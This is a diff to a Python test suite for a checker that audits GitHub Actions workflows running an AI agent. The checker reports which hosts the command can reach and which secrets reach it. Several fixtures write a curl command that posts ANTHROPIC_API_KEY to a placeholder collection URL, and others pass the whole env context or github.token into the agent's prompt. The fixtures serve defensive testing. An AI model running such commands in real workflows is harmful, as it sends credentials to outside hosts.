@@ -543,13 +543,64 @@ class ModelKeysTest(unittest.TestCase):
                                             "api.openai.com (through AWF's API proxy)"])
         self.assertIn("api.anthropic.com or api.openai.com", detail(f))
 
-    def test_adding_a_model_key_changes_the_finding(self):
-        """What the command can reach is part of the finding, so an acceptance of the job without a key
-        does not cover it with one."""
+    def test_the_providers_host_is_part_of_the_finding(self):
+        """What the command can reach is one of the finding's facts, as the allow-list is. (Any change to
+        the workflow file changes the finding too, through its digest.)"""
         cat = checker.load()
         plain = self.check(keyed(model_keys=None, step_env={}), cat=cat)
         with_key = self.check(keyed(), cat=cat)
-        self.assertNotEqual(baseline.key(plain), baseline.key(with_key))
+        self.assertEqual(plain.facts["allow"], ["api.example.com"])
+        self.assertEqual(with_key.facts["allow"], ["api.example.com", "api.anthropic.com (through AWF's API proxy)"])
+
+    def test_a_key_written_into_run_through_the_env_context_is_passed_to_the_command(self):
+        """Found by the first review: GitHub writes a step's inputs with the env context, which holds the
+        step's own env, so `${{ env.ANTHROPIC_API_KEY }}` in `run` hands the command the key that
+        `model-keys` gives to the proxy."""
+        for written in ("${{ env.ANTHROPIC_API_KEY }}", "${{ env.anthropic_api_key }}",
+                        "${{ format('{0}', env.ANTHROPIC_API_KEY) }}", "${{ env['ANTHROPIC_API_KEY'] }}"):
+            run = f"claude -p 'review the change'\ncurl -d 'k={written}' https://api.example.com/collect"
+            result = run_check(workflow(keyed(run=run)))
+            f, control = egress(result), secret_control(result)
+            with self.subTest(written=written):
+                self.assertNotIn("goes to AWF's API proxy", control.detail)
+                self.assertIn("passed to the command in its run input, through env.ANTHROPIC_API_KEY", control.detail)
+                self.assertIn("the credentials passed to it included (secrets.ANTHROPIC_API_KEY)", detail(f))
+        # The whole env context: every credential of the step's env reaches the command, and the
+        # checker cannot name what part of it is used.
+        f = self.check(keyed(run="claude -p '${{ toJSON(env) }}'"))
+        self.assertEqual(verdict(f), CANNOT_TELL)
+        self.assertIn("whole env context", detail(f))
+        # A secret named under neither input, written in through env, is passed too.
+        env = {"REVIEW_KEY": "${{ secrets.REVIEW_KEY }}"}
+        control = secret_control(run_check(workflow(keyed(model_keys=None, step_env=env,
+                                                          run="claude -p 'use ${{ env.REVIEW_KEY }}'"))))
+        self.assertNotIn("named under neither", control.detail)
+        self.assertIn("secrets.REVIEW_KEY is passed to the command in its run input, through env.REVIEW_KEY",
+                      control.detail)
+        # github.token through env: the egress finding names it, though there is no secret finding.
+        steps = keyed(model_keys=None, step_env={"TOK": "${{ github.token }}"}, run='claude -p "use ${{ env.TOK }}"')
+        f = self.check(steps)
+        self.assertIn("the credentials passed to it included (github.token)", detail(f))
+        # In another input, through env: not placed.
+        steps = keyed().replace("          allow:", "          note: '${{ env.ANTHROPIC_API_KEY }}'\n          allow:")
+        self.assertEqual(verdict(self.check(steps)), CANNOT_TELL)
+
+    def test_the_secret_finding_says_what_could_not_be_placed(self):
+        """Found by the first review: a credential the checker could not place was named nowhere."""
+        steps = keyed(extra="        if: github.token != ''\n").replace(
+            "          allow:", "          note: '${{ secrets.OTHER }}'\n          allow:")
+        control = secret_control(run_check(workflow(steps)))
+        self.assertIn("the checker could not place", control.detail)
+        self.assertIn("secrets.OTHER", control.detail)
+        self.assertIn("github.token", control.detail)
+        control = secret_control(run_check(workflow(keyed(model_keys="GEMINI_API_KEY"))))
+        self.assertIn("the action would refuse to run", control.detail)
+
+    def test_long_lists_say_how_many_more(self):
+        env = {f"K{n}": f"${{{{ secrets.K{n} }}}}" for n in range(5)}
+        f = self.check(keyed(model_keys=None, step_env=env, env_input=",".join(env)))
+        self.assertEqual(verdict(f), VERIFIED)
+        self.assertIn("secrets.K0, secrets.K1, secrets.K2 and 2 more", detail(f))
 
     def test_secret_findings_say_where_the_key_goes_whatever_the_verdict(self):
         for cat, expected in ((None, VERIFIED), (checker.load(), CANNOT_TELL)):
@@ -800,6 +851,8 @@ class ReleaseDataTest(unittest.TestCase):
         problems = floor_problems([BEFORE_FLOOR, "0" * 40, "v1"], FLOOR)
         self.assertEqual(len(problems), 3, problems)
         self.assertIn("not at or after", problems[0])
+        self.assertEqual(lists_differ(FLOOR), "")
+        self.assertEqual(lists_differ(AFTER_FLOOR), "")
 
 
 FLOOR = "f0bfbd79398a5950bb3c72860e98dfdaa66c929f"          # the merge of #128, slice 2c.4
@@ -839,7 +892,41 @@ def floor_problems(releases, floor):
             continue
         if found.returncode != 0:
             problems.append(f"{sha[:12]} is not at or after {floor[:12]}, the merge of slice 2c.4")
+            continue
+        differs = lists_differ(sha)
+        if differs:
+            problems.append(f"{sha[:12]}: {differs}")
     return problems
+
+
+def lists_differ(sha):
+    """How the action at `sha` reads its inputs differently from the checker's copy of its lists
+    (found by the first review: the floor alone would let a later commit that changed them be listed),
+    or an empty string."""
+    import importlib.util
+    import subprocess
+    import tempfile
+    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    try:
+        shown = subprocess.run(["git", "-C", root, "show", f"{sha}:actions/egress/egress.py"],
+                               capture_output=True, timeout=30)
+    except (OSError, subprocess.SubprocessError) as exc:
+        return f"its egress.py could not be read ({exc})"
+    if shown.returncode != 0:
+        return "it has no actions/egress/egress.py"
+    with tempfile.TemporaryDirectory() as tmp:
+        path = os.path.join(tmp, "egress_at_commit.py")
+        with open(path, "wb") as handle:
+            handle.write(shown.stdout)
+        spec = importlib.util.spec_from_file_location("obaaf_egress_at_commit", path)
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+    for name, mine in (("MODEL_KEYS", egress_mod.MODEL_KEYS), ("WITHHELD_BY_AWF", egress_mod.WITHHELD_BY_AWF)):
+        if getattr(module, name, None) != mine:
+            return f"its {name} is not the checker's"
+    if getattr(getattr(module, "_NAME_RE", None), "pattern", None) != egress_mod.NAME_RE.pattern:
+        return "its _NAME_RE is not the checker's"
+    return ""
 
 
 if __name__ == "__main__":
